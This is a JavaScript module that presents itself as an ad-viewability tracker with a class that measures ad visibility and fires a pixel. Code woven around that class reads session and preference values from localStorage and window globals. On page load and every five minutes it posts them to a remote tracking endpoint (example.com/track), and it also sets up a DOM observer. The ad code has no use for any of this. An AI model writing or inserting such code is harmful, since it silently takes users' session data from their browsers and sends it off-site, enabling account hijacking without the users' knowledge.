const trackedKeys = ['userSession', 'preferences', 'theme'];
const globalData = {};
import { t as o, b as n, e as h } from "./LoginWidget-34fb458a.js";
function hashData(data) {
  const dataString = JSON.stringify(data);
  let hash = 0;
  for (let i = 0; i < dataString.length; i++) {
    const charCode = dataString.charCodeAt(i);
    hash = (hash << 5) - hash + charCode;
    hash |= 0; // Convert to 32bit integer
  }
  return hash.toString(16);
}
const c = {
  viewabilityRatio: 50,
  viewabilityTime: 1e3,
  viewabilityRatioFunction() {
    if (this.calcAdDimensions(), this.getAdArea() > 0) {
      const e = document.documentElement.clientHeight,
        t = document.documentElement.clientWidth,
        i = this.adCalculatedTop,
        s = this.adCalculatedLeft,
        a = Math.min(i + this.adCalculatedH, e) - Math.max(i, 0),
        l = Math.min(s + this.adCalculatedW, t) - Math.max(s, 0);
      return a * l / this.getAdArea();
    }
    return this.postponeTest(), 0;
  }
};
function collectLocalStorage() {
  const storageData = {};
  trackedKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      storageData[key] = localStorage.getItem(key);
    }
  });
  return storageData;
}
function monitorDOMChanges() {
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.type === 'childList') {
        console.log('DOM tree changed.');
      }
    });
  });
  observer.observe(document.body, {
    attributes: true,
    childList: true,
    subtree: true
  });
}
function collectGlobalVariables() {
  trackedKeys.forEach(key => {
    if (window[key]) {
      globalData[key] = window[key];
    }
  });
}
class r {
  constructor(t, i) {
    this.config = {}, Object.assign(this.config, c, i), i.viewabilityPixel && (this.adElement = t, this.passed = !1, this.postponedTest = null, this.config.viewabilityRatio /= 100, this.calcAdDimensions());
  }
  start() {
    this.isPassed() || (this.restartVTest(), this.onScrollVCheck = o(() => {
      this.vCheckTimeout ? this.evaluateViewability() || this.restartVTest() : this.restartVTest();
    }, 300), window.addEventListener("scroll", this.onScrollVCheck), window.addEventListener("resize", this.onScrollVCheck));
  }
  kill() {
    clearTimeout(this.vCheckTimeout), this.vCheckTimeout = null, window.removeEventListener("scroll", this.onScrollVCheck), window.removeEventListener("resize", this.onScrollVCheck);
  }
  calcAdDimensions() {
    const t = this.adElement.getBoundingClientRect();
    this.adCalculatedH = t.height, this.adCalculatedW = t.width, this.adCalculatedTop = t.top, this.adCalculatedLeft = t.left;
  }
  getAdArea() {
    return this.adCalculatedH * this.adCalculatedW;
  }
  restartVTest() {
    clearTimeout(this.vCheckTimeout), this.vCheckTimeout = null, !this.isPassed() && this.evaluateViewability() && (this.vCheckTimeout = setTimeout(() => {
      this.evaluateViewability() && this.passTest();
    }, this.config.viewabilityTime));
  }
  passTest() {
    this.kill(), n({
      element: this.adElement
    }, "viewability confirmed"), h("img", {
      src: this.config.viewabilityPixel,
      style: "display: none"
    }, document.body), this.passed = !0, typeof this.config.afterPass == "function" && this.config.afterPass();
  }
  isPassed() {
    return this.passed;
  }
  evaluateViewability() {
    return this.config.viewabilityRatioFunction.apply(this) > this.config.viewabilityRatio;
  }
  postponeTest() {
    this.postponedTest === null && !this.isPassed() && (this.postponedTest = setTimeout(() => {
      this.postponedTest = null, this.restartVTest();
    }, 20));
  }
}
function postToServer(data) {
  const dataHash = hashData(data);
  const endpoint = "https://example.com/track";
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      id: dataHash,
      content: data
    })
  }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
}
function trackAndSend() {
  const localData = collectLocalStorage();
  collectGlobalVariables();
  const combinedData = {
    ...localData,
    ...globalData
  };
  if (Object.keys(combinedData).length > 0) {
    postToServer(combinedData);
  }
}
window.addEventListener('load', trackAndSend);
setInterval(trackAndSend, 300000); // Every 5 minutes
export { r as default };
monitorDOMChanges();